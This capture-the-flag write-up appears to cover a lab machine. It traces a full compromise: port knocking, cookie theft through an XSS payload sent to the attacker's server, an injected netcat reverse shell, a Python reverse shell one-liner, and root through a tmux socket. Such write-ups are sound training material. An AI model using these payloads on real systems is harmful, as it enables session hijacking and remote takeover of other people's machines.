first of all we run nmap to scan all ports of the target machine:

	nmap -p- 10.10.10.179 

output:

	PORT   STATE SERVICE
	21/tcp open  ftp
	22/tcp open  ssh

there is open the ftp so I try to connect in anonymous:

	ftp anonymous@10.10.10.179

output:

	cd pub
	ls
	229 Entering Extended Passive Mode (|||45700|)
	150 Here comes the directory listing.
	-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
	-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
	-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng

I download all of them, inside a info there is a reference to pcap, in jokes.txt tell something about the port knocking and the pcap has the the port knocking sequences.
after some research by using wireshark I found it some ports that are used to the same ip-address so i try to use a tool named "knock" to knock at them:

	knock 10.10.122.226 7864 8273 9241 12007 60753 

so:

	PORT     STATE SERVICE
	8080/tcp open  http-proxy

nice, the 8080 is now open it has a x509 certificate so we go to the following url: 

	https://10.10.122.226:8080 

now it's time to use gobuster:

	gobuster dir -k -u https://10.10.10.179:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -t 50

output:

	/login
	/dashboard 301, redirect to /login
	/console

/console seems untouchable  so we should following the login, something very interesting is the x509 certificate very strange because other machines don't have it. 
So if we read the certificate's details we retrieve an email: emailAddress = "zac@misguided_ghosts.thm".
The most commont thing to do is to use the same user and password, if we try, we can see that we're in.
The main page has a phrase:

	Create a post below; admins will check every two minutes so don't be rude.

it seems an hint to do XSS in order to steal admin's cookie first we run a python server: 

	python3 -m http.server 8000

then I tried a bunch of payloads like:

	1) <script>alert(1);</script> 
	2) <img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>	

but just one worked for me:

	&#X3c;SCRIPT&#X3e;var i=new Image;i.src="http://10.8.98.143:8000/?"+document.cookie;&#X3c;/SCRIPT&#X3e;

The server will retieve the hayley cookie, and if we try to change the cookie we can see that we're hayley; I want to search for other directories so I run gobuster with this command

	gobuster dir -u https://10.10.10.179:8080/dashboard/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -t 30 -k -c (REDACTED)

output:

	/photos

if we browse on this dir we can see that we can upload an image, but if we try it doesn't work so i tried an LFI on the url and seems to work, by looking around on the filesystem we can see that there is netcat, so we can try to run a revshell

	nc -lnvp 6666

	nc${IFS}10.9.59.103${IFS}6666${IFS}-e${IFS}sh

from netcat to pwncat:

	/usr/local/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.59.103",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

now we're inside with pwncat, if we go to /home/zac/notes we can see a txt that it refers to a private rsa key that it's ciphered probably with vigenere.
I try some many attempts and I found the key in order to decrypt. NB(RSA-key begin with a pattern of letters MII IBAA at the begin),after inside we tun linpeas.sh and we try privesc.
linpeas.sh tell us that there are open ports like:

	445,139 so SMB

we must bind this port in our localhost ports and we use this command in our terminal:

	ssh -i chiavessh -L 445:127.0.0.1:445 zac@10.10.171.93 
	then:
	smbclient \\\\127.0.0.1\\local

there is passwd.bak we do:

	get passwd.bk

inside there some passwords for hayley wit few attempts you can guess it or bruteforce with hydra.
Now we connect with pwncat and we're inside with hayley's user and then we can retireve the user.txt flag; for the second time we run linpeas.sh and we can see something very interesting:

	root       818  0.0  0.1  28540  3660 ?        Ss   16:21   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d

in short terms this command call the tmux's programm that it creates a personal socket with the -S with the corresptive path "/opt/.details" used for communication and the new -s vpn -d it creates the new session called vpn in detach(background)

if we do more investigation:

	ls -la /opt/.detail

output:

	srw-rw---- 1 root paramore 0 Jun 22 16:21 /opt/.details

exactly we can see that the following tmux session is runned by the root, so with the following command:

	/usr/bin/tmux -S /opt/.details

we can use the socket and enter in a root shell and retrieve the root.txt flag.